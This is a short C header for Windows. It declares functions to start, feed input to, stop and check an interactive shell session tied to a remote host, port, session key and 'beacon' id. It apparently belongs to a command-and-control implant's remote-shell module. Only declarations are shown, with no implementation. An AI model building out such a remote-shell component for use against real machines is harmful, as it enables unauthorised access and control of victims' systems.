#pragma once
#include <winsock2.h>
#include <windows.h>
#include <stdint.h>

int  shell_start(const char *host, uint16_t port, uint8_t *session_key, uint32_t beacon_id, uint32_t label);
int  shell_write_stdin(const uint8_t *input, int len);
void shell_stop(void);
int  shell_is_active(void);
